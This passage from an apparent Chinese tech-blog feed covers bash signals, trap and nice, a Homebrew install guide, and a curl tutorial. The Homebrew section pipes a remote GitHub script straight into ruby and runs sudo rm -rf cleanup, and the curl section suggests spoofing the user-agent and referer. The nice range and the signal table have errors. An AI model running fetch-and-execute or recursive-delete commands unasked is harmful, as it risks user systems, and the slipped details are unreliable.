class="line"></span><br><span class="line">输出:</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span>./func.sh</span><br><span class="line">0 2 4 6 8 10 12 14 16 18 20</span><br></pre></td></tr></table></figure></li></ul><h4 id="shell-创建库"><a href="#shell-创建库" class="headerlink" title="shell 创建库"></a>shell 创建库</h4><p>bash shell 允许创建函数文件，然后多个脚本中引用该库文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cat global.sh </span><br><span class="line">value=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span>cat read.sh</span><br><span class="line"><span class="meta">#</span>!/bin/bash </span><br><span class="line">. ./global.sh  ## source ./global.sh</span><br><span class="line"></span><br><span class="line">echo "global : value = $value"</span><br></pre></td></tr></table></figure><h4 id="shtool-构建库"><a href="#shtool-构建库" class="headerlink" title="shtool 构建库"></a>shtool 构建库</h4><h4 id="退出脚本"><a href="#退出脚本" class="headerlink" title="退出脚本"></a>退出脚本</h4><ol><li><p>shell 中运行的每个命令都使用 退出状态码来告诉shell已经运行完毕. 退出状态码是一个 0 ~ 255 的整数值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $?   ## 查看退出状态码</span><br></pre></td></tr></table></figure></li><li><p>exit 命令</p><p>默认情况下, shell 脚本会以脚本中最后一个命令的退出状态码退出; 但可以改变这种默认行为, 返回自己的退出状态码， exit 命令允许自己再脚本结束时指定一个退出状态码</p></li></ol><h4 id="脚本调试"><a href="#脚本调试" class="headerlink" title="脚本调试"></a>脚本调试</h4><ol><li><p>bash 调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -x shellfile  ## 进行脚本调试</span><br></pre></td></tr></table></figure></li><li><p>脚本调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set -x     ## 开始调试</span><br><span class="line"></span><br><span class="line">cat $filename | while read line</span><br><span class="line">do</span><br><span class="line">    echo "ifs.sh $count: " $line    </span><br><span class="line">    count=$[ $count + 1 ]</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">set +x    ## 结束调试</span><br></pre></td></tr></table></figure><p>​</p><p>​</p></li></ol><h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><p>Linux 利用信号与运行在系统上的进程进行通信。</p><h4 id="常用信号"><a href="#常用信号" class="headerlink" title="常用信号"></a>常用信号</h4><table><thead><tr><th>信号</th><th>值</th><th>描述</th><th>组合按键</th></tr></thead><tbody><tr><td>1</td><td>SIGHUP</td><td>挂起进程</td><td></td></tr><tr><td>2</td><td>SIGINT</td><td>终止进程</td><td>Ctrl + C</td></tr><tr><td>3</td><td>SIGQUIT</td><td>停止进程</td><td></td></tr><tr><td>9</td><td>SIGKILL</td><td>无条件终止进程</td><td>kill -9</td></tr><tr><td>15</td><td>SIGTERM</td><td>尽可能终止进程</td><td></td></tr><tr><td>17</td><td>SIGSTOP</td><td>无条件停止进程，但不是终止进程</td><td></td></tr><tr><td>18</td><td>SIGTSTP</td><td>停止或暂停进程,  但不是终止进程</td><td>Ctrl + Z</td></tr><tr><td>19</td><td>SIGCONT</td><td>继续运行停止的进程</td></tr></tbody></table><h4 id="捕捉信号-trap"><a href="#捕捉信号-trap" class="headerlink" title="捕捉信号  trap"></a>捕捉信号  trap</h4><p>trap命令允许指定shell脚本要监看并从shell中拦截的Linux信号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trap  commands  signals</span><br></pre></td></tr></table></figure><p>示例代码:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">trap "echo 'Sorry !  I have trapped Ctrl + C' " SIGINT</span><br><span class="line"></span><br><span class="line">echo "this is a test trap commands script"</span><br><span class="line"></span><br><span class="line">count=1</span><br><span class="line"></span><br><span class="line">while [ $count -le 10 ]</span><br><span class="line">do</span><br><span class="line">    echo "Loop: #$count"</span><br><span class="line">    sleep 1 </span><br><span class="line">    count=$[ $count + 1 ]</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">./trap.sh </span><br><span class="line">this is a test trap commands script</span><br><span class="line">Loop: #1</span><br><span class="line">Loop: #2</span><br><span class="line">^CSorry !  I have trapped Ctrl + C</span><br><span class="line">Loop: #3</span><br></pre></td></tr></table></figure><ol><li><p>捕获退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trap &quot;echo godbye...&quot; EXIT</span><br></pre></td></tr></table></figure></li><li><p>修改或移除信号</p><p>在脚本不同的位置进行不同的捕获处理，只需要重新使用带有新选项的trap命令即可.</p><p>删除已设置好的捕获, 只需要在trap命令与希望恢复默认行为的信号列表之间叫上两个破折号即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trap -- SIGINT</span><br><span class="line">echo removed the trap&quot;&quot;</span><br></pre></td></tr></table></figure></li></ol><h4 id="非控制台下运行脚本-nohup"><a href="#非控制台下运行脚本-nohup" class="headerlink" title="非控制台下运行脚本  nohup"></a>非控制台下运行脚本  nohup</h4><p>nohup  命令运行另一个命令来阻断所有发送给该进程的SIGHUP信号, 这会在退出终端会话时阻止进程退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup [commands] / [filename]   &amp;</span><br></pre></td></tr></table></figure><h3 id="谦让度-nice-renice"><a href="#谦让度-nice-renice" class="headerlink" title="谦让度 nice  renice"></a>谦让度 nice  renice</h3><p>在多任务操作系统中, 内核负责将CPU时间分配给系统上运行的每个进程. </p><p>调度优先级是内核分配给进程分CPU时间.</p><p>nice 优先级  -20(最高优先级)  —-   -19(最低优先级)  默认bash shell以优先级0来启动所有进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"> $</span> ps -p 31504 -o pid,ppid,ni,cmd  </span><br><span class="line">  PID  PPID  NI CMD</span><br><span class="line">31504 30039   0 vi trap.sh</span><br><span class="line"><span class="meta">#</span># ni 表示优先级</span><br><span class="line"></span><br><span class="line">nice -n 10 filescript 2&gt;/dev/null &amp;   ## --</span><br></pre></td></tr></table></figure><h4 id="renice-改变系统上以及运行命令的优先级"><a href="#renice-改变系统上以及运行命令的优先级" class="headerlink" title="renice  改变系统上以及运行命令的优先级"></a>renice  改变系统上以及运行命令的优先级</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">renice -n 10 -p pid</span><br></pre></td></tr></table></figure><p>renice 限制:</p><ul><li>只能对属于自己的进程执行renice</li><li>只能通过renice降低进程的优先级</li><li>root用户可以通过renice来任意调整进程的优先级</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mac_Homebrew 软件包管理器</title>
      <link href="/2017/12/01/commands/Mac-Homebrew-%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/"/>
      <url>/2017/12/01/commands/Mac-Homebrew-%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="安装HomeBrew"><a href="#安装HomeBrew" class="headerlink" title="安装HomeBrew"></a>安装HomeBrew</h4><ul><li><p>首先打开App Stroe 更新系统，安装最新版本xcode;</p></li><li><p>安装HomeBrew 到 /usr/local</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure></li></ul><a id="more"></a><p><br></p><h4 id="卸载HomeBrew"><a href="#卸载HomeBrew" class="headerlink" title="卸载HomeBrew"></a>卸载HomeBrew</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)&quot;</span><br></pre></td></tr></table></figure><h4 id="重装"><a href="#重装" class="headerlink" title="重装"></a>重装</h4><ol><li><p>备份/usr/lcoal/Cellar</p></li><li><p>删除HomeBrew相关文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local</span><br><span class="line">sudo rm -rf Library .git .gitignore bin/brew README.md share/man/man1/brew</span><br><span class="line">sudo rm -rf Homebrew</span><br><span class="line">sudo rm -rf ~/Library/Caches/Homebrew</span><br></pre></td></tr></table></figure></li><li><p>卸载HomeBrew</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)&quot;</span><br></pre></td></tr></table></figure></li><li><p>安装HomeBrew</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure></li><li><p>将第一步备份文件放回原处</p></li><li><p>更新Homebrew以及管理的软件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">brew update</span><br><span class="line">brew upgrade</span><br><span class="line">brew cleanup</span><br></pre></td></tr></table></figure></li><li><p>brew doctor检测Homebrew潜在问题，并自行排错。如使用<strong> brew link 软件名</strong> 将备份的软件重新symlink到Homebrew上。</p></li></ol><h4 id="Homebrew-使用"><a href="#Homebrew-使用" class="headerlink" title="Homebrew 使用"></a>Homebrew 使用</h4><ul><li><p>安装软件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install 软件名    ## brew install git</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>卸载软件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew uninstall 软件名  ## brew uninstall git</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>查找软件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew search 查询内容</span><br></pre></td></tr></table></figure><ul><li><p>普通查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew search git</span><br></pre></td></tr></table></figure></li><li><p>正则查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew search /gi*/</span><br></pre></td></tr></table></figure><p>​</p></li></ul></li></ul><ul><li><p>升级软件</p><ul><li><p>指定更新软件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew upgrade 软件名  ## brew upgrade git</span><br></pre></td></tr></table></figure></li><li><p>更新所有软件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew upgrade</span><br></pre></td></tr></table></figure><p>​</p></li></ul></li><li><p>清理软件</p><ul><li><p>查看哪些软件要被清楚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cleanup -n</span><br></pre></td></tr></table></figure></li><li><p>清除指定软件的所有老版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cleanup 软件名</span><br></pre></td></tr></table></figure></li><li><p>清除所有软件的老版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cleanup</span><br></pre></td></tr></table></figure><p>​</p></li></ul></li><li><p>关联软件</p><ul><li><p>清除无用的symlink, 且清除与之相关的位于 /Application 和 ~/Applications 中的无用App链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew prune</span><br></pre></td></tr></table></figure></li><li><p>将指定软件的安装文件symlink 到HomeBrew上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew link 软件名</span><br></pre></td></tr></table></figure><blockquote><p>brew install 安装的软件会自动执行link操作</p><p>DIY安装的需要手动link操作</p><p>加上 –overwrite选项, 会先删除旧的symlink, 再进行新的link操作</p></blockquote><p>​</p></li></ul></li><li><p>信息查询</p><ul><li><p>查看Homebrew版本号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew -v</span><br></pre></td></tr></table></figure></li><li><p>列出已安装的软件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew list</span><br></pre></td></tr></table></figure></li><li><p>用浏览器打开homebrew官网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew home</span><br></pre></td></tr></table></figure></li><li><p>显示软件信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew info</span><br></pre></td></tr></table></figure><p>​</p></li></ul></li><li><p>其他操作</p><ul><li><p>升级homebrew自身软件关联</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew update</span><br></pre></td></tr></table></figure></li><li><p>检测系统中与homebrew有关的潜在问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew doctor</span><br></pre></td></tr></table></figure><p>​</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 包管理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>curl详细说明以及示例</title>
      <link href="/2017/11/13/commands/curl%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E4%BB%A5%E5%8F%8A%E7%A4%BA%E4%BE%8B/"/>
      <url>/2017/11/13/commands/curl%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E4%BB%A5%E5%8F%8A%E7%A4%BA%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<p>Curl一个功能非常强大的命令行工具，支持HTTP、FTP等协议。本文以访问<a href="">gangzai.online</a>为示例，供大家学习使用。</p><a id="more"></a><p><br></p><h3 id="http-url-port"><a href="#http-url-port" class="headerlink" title="http://url:port"></a><a href="http://url:port" target="_blank" rel="noopener">http://url:port</a></h3><h4 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h4><p>​    HTTP协议用于从web服务器上读取数据，它是基于TCP/IP协议上的一个简单的协议。该协议同时也能够让你通过使用一些不同的方法向服务器提交数据。</p><p>​    HTTP协议是向服务器发送的要进行一个特殊操作的ACSII文本，随后在要求的内容发送给客户端之前，服务器会向客户端发送几行回应的数据。</p><p>​    客户端CURL向服务器发送一项请求，请求通常包括方法（比如GET、POST、HEAD等等）、一些请求的头、有时还有请求正文。接到请求后，服务器返回状态行（表明访回是否顺利）、回应头和内容正文。正文是客户要求的数据，通常是一些HTML资源、图片。</p><p>curl  -v , -verbose  会显示curl向服务器发送的命令和其他的一些信息. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ curl -verbose gangzai.online</span><br><span class="line"></span><br><span class="line">* Connected to gangzai.online (151.101.1.147) port 80 (#0)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; User-Agent: curl/7.35.0</span><br><span class="line">&gt; Host: gangzai.online</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure><p><br></p><h4 id="Url"><a href="#Url" class="headerlink" title="Url"></a>Url</h4><p>​    URL（统一资源定位符）用来描述Internet上一个资源详细地址的规范，大家可能看到过很多次这样的地址，比如www.baidu.com，www.dachengge.com，j定义这个规范最权威的标准是RFC 3986。</p><p><br></p><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>​    每一个CURL支持的协议都是运行在特定的端口上，通常情况下不用端口的问题，除非进行网站的测试，而使用不同的端口，这是可以使用不同的端口，使用的方法是，在网站域名后面家一个端口号，用冒号隔开，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://dachengge.com:80/</span><br></pre></td></tr></table></figure><p>如果使用代理服务器时，也可以指定代理服务器的端口号:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl –proxy http://abc.com:80 http:dachengge.com/</span><br></pre></td></tr></table></figure><p><br></p><h4 id="使用账号和密码"><a href="#使用账号和密码" class="headerlink" title="使用账号和密码"></a>使用账号和密码</h4><p>​    有时有些服务需要HTTP认证，当访问这些网站时需要提供账号和密码，这是你需要在URL里面提供账号密码，或者单独提供:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CURL http://user:password@example.com/</span><br><span class="line">CURL -u user:password http://example.com/</span><br></pre></td></tr></table></figure><p><img src="/img/shell/curl_from.png" alt="curl_username"></p><p><br></p><h3 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a><strong>Cookies</strong></h3><p>浏览器通过使用Cookie来记录客户端的状态，并向服务器发送。Cookies是键=》值对应的形式，服务器向客户端发送cookies的到期时间和其他一些属性。</p><p>很多应用使用Cookies连接服务器，并进行一系列操作，完成一个会话。CURL要是完成这样的操作，就必须保存Cookies。</p><p><br></p><h4 id="cookies选项"><a href="#cookies选项" class="headerlink" title="cookies选项"></a>cookies选项</h4><p>最简单发送Cookies的方法就是向服务器发送请求的同时加上这些数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl –cookie “name=Daniel” http://www.dachengge.com</span><br></pre></td></tr></table></figure><p>Cookies像其他HTTP头一样发送，这对于CURL记录这头非常有用，使用–dump-header记，将HEADER和Cookies存在文件里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl –dump-header headers_and_cookies www.dachengge.com</span><br></pre></td></tr></table></figure><p>如果只记录下Cookies，使用–cookie-jar：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl –cookie-jar cookieFile http://www.dachengge.com</span><br></pre></td></tr></table></figure><p><br></p><h4 id="自动更新和追踪cookies"><a href="#自动更新和追踪cookies" class="headerlink" title="自动更新和追踪cookies"></a>自动更新和追踪cookies</h4><p>如果让curl自动保存新的cookie，且提交请求时再带上新的cookie时，可以将–cookie 和–cookie-jar 指向同一个文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl  –include –cookie “cook.txt” –cookie-jar “cook.txt” http://dachengge.com</span><br><span class="line">curl  –include –cookie “cook.txt” –cookie-jar “cook.txt” http://abc.dachengge.com</span><br></pre></td></tr></table></figure><p>即每行指令中都读取和写入相同的cookie文件，系统会自动更新cookie。</p><p><br></p><h4 id="使用变量保存cookies"><a href="#使用变量保存cookies" class="headerlink" title="使用变量保存cookies"></a>使用变量保存cookies</h4><p>上一节讲的使用–cookie和–cookie-jar是利用文件来保存和读取cookie，由于文件操作比较费资源，下面将讨论不使用文件，而是使用变量来保存和读取cookie:</p><p>当输入：curl www.baidu.com –head， 大家会看到百度首页的头信息，里面有很多set-cookies，即设置cookie变量。首先将目标网页的头保存，然后用grep查找cookie。。。</p><p><br></p><h3 id="HTML-表单"><a href="#HTML-表单" class="headerlink" title="HTML 表单"></a>HTML 表单</h3><h4 id="使用GET方法的表单"><a href="#使用GET方法的表单" class="headerlink" title="使用GET方法的表单"></a>使用GET方法的表单</h4><p>HTML中使用GET方法提交数据的页面是这样的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=”GET” action=”junk.cgi”&gt;</span><br><span class="line">&lt;input type=text name=”birthyear”&gt;</span><br><span class="line">&lt;input type=submit name=press value=”OK”&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>​    如果对浏览器熟悉的话，上面的代码就会显示成，一个文本框和一个OK按钮。这是填入1905，然后点击“OK“，浏览器就会生成一个新的URL地址，URL会将”junk.cgi?birthyear=1905&amp;press=OK“添加到之前的URL地址后面。如果之前表单页面地址是 “www.hotmail.com/when/birth.html”，在表单上填写1905，点击OK按钮后，随之打开的页面会变成    “www.hotmail.com/when/junk.cgi?birthyear=1905&amp;press=OK”。要使用CURL程序用GET方法提交数据，直接将数据放在ACTION指向的页面（以前面的表单为例）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://www.hotmail.com/junk.cgi?birthyear=1905&amp;press=OK&quot;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="使用POST方法的表单"><a href="#使用POST方法的表单" class="headerlink" title="使用POST方法的表单"></a>使用POST方法的表单</h4><p>GET方法将所有的输入域名称和值都放在URL地址里面，如果能通过值来做某些页面的书签（例如www.abc.com/index.php?id=18保存成书签可以直接访问），GET通常是个好办法，但是如果输入的数据是保密的或者有大量的数据要输入时，会产生一个非常长的URL地址。下面是一个使用POST方法的表单:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=”POST” action=”junk.cgi”&gt;</span><br><span class="line">&lt;input type=text name=”birthyear”&gt;</span><br><span class="line">&lt;input type=submit name=press value=” OK “&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>CURL命令使用POST方法提交和上面相同的数据，就会使这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl –data &quot;birthyear=1905&amp;press=%20OK%20&quot;  http://www.example.com/when.cgi</span><br></pre></td></tr></table></figure><p>注意，OK前面和后面的%20是空格，使用了urlencode编码，POST方法的Content-Type通常是application/x-www-form-urlencoded。通过POST方法向服务器发送的数据必须被编码，新版本的CURL使用–data-urlencode编码，前面的空格变成%20就是这个道理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl –data-urlencode &quot;name=I am Daniel&quot; http://www.example.com</span><br></pre></td></tr></table></figure><p>如果在一个命令行里面多次使用–data参数，CURL会将所有–data后面的数据使用&amp;拼接起来。</p><p><br></p><h4 id="文件上传提交"><a href="#文件上传提交" class="headerlink" title="文件上传提交"></a>文件上传提交</h4><p>在1995年，他们定义另外一种HTTP提交数据的方法，这种方法在RFC 1867中有描述。这种方法设计得能更好地支持文件上传，假设文件上传的表是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=”POST” enctype=’multipart/form-data’ action=”upload.cgi”&gt;</span><br><span class="line">&lt;input type=file name=upload&gt;</span><br><span class="line">&lt;input type=submit name=press value=”OK”&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>从encType是上可以看出，将要发送的数据类型是multipart/form-data，即<strong>文件类型</strong> 。通过CURL向服务器传递数据的命令如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl –form upload=@localfilename –form press=OK   [URL]</span><br></pre></td></tr></table></figure><p><br></p><h3 id="络访问注意事项"><a href="#络访问注意事项" class="headerlink" title="络访问注意事项"></a>络访问注意事项</h3><p>为了使CURL访问网页时跟浏览器访问的一样，就必须注意下面的事项：</p><ul><li>使用–trace-ascii把所有的细节记录下来，分析和研究。</li><li>确定检查和使用Cookie，使用–cookie读取，使用–cookie-jar写入cookie。</li><li>使用user-agent仿冒浏览器。</li><li>使用referer让服务器觉得是合法的访问请求。</li><li>使用POST时，要按照文本域的顺序提交。</li></ul><p><br></p><h3 id="参数-示例"><a href="#参数-示例" class="headerlink" title="参数 示例"></a>参数 示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">-A:随意指定自己这次访问所宣称的自己的浏览器信息</span><br><span class="line">-b/--cookie &lt;name=string/file&gt; cookie字符串或文件读取位置，使用option来把上次的cookie信息追加到http request里面去。</span><br><span class="line">-c/--cookie-jar &lt;file&gt; 操作结束后把cookie写入到这个文件中</span><br><span class="line">-C/--continue-at &lt;offset&gt;  断点续转</span><br><span class="line">-d/--data &lt;data&gt;   HTTP POST方式传送数据</span><br><span class="line">-D/--dump-header &lt;file&gt; 把header信息写入到该文件中</span><br><span class="line">-F/--form &lt;name=content&gt; 模拟http表单提交数据</span><br><span class="line">-v/--verbose 小写的v参数，用于打印更多信息，包括发送的请求信息，这在调试脚本是特别有用。</span><br><span class="line">-m/--max-time &lt;seconds&gt; 指定处理的最大时长</span><br><span class="line">-H/--header &lt;header&gt; 指定请求头参数</span><br><span class="line"></span><br><span class="line">-x  ip:port 指定使用的http代理，例如：curl -x 192.168.1.1:8080 www.jbxue.com</span><br><span class="line">-D head.txt  将服务器的返回的header保存为文件，头部的cookie也可被保存，例如：curl -D header.txt www.jbxue.com  </span><br><span class="line">如果希望从本地文件中获取表单数据，则在文件名前加@ ，例如：curl -d @data.xml http://www.jbxue.com</span><br><span class="line">若希望从标准输入获取则用 curl -d &quot;name=username&amp;passwd=pwd&quot; http://www.jbxue.com</span><br><span class="line">-X/--request method 用户定义的HTTP请求方法名如 curl -X GET www.baidu.com</span><br><span class="line">-k/--insecure 允许不使用证书到SSL站点</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-s/--slient 减少输出的信息，比如进度</span><br><span class="line">--connect-timeout &lt;seconds&gt; 指定尝试连接的最大时长</span><br><span class="line">-x/--proxy &lt;proxyhost[:port]&gt; 指定代理服务器地址和端口，端口默认为1080</span><br><span class="line">-T/--upload-file &lt;file&gt; 指定上传文件路径</span><br><span class="line"></span><br><span class="line">-o/--output &lt;file&gt; 指定输出文件名称</span><br><span class="line">--retry &lt;num&gt; 指定重试次数</span><br><span class="line">-e/--referer &lt;URL&gt; 指定引用地址</span><br><span class="line">-I/--head 仅返回头部信息，使用HEAD请求</span><br><span class="line">-u/--user &lt;user[:password]&gt;设置服务器的用户和密码</span><br><span class="line">-O:按照服务器上的文件名，自动存在本地</span><br><span class="line">-r/--range &lt;range&gt;检索来自HTTP/1.1或FTP服务器字节范围</span><br><span class="line">-T/--upload-file &lt;file&gt; 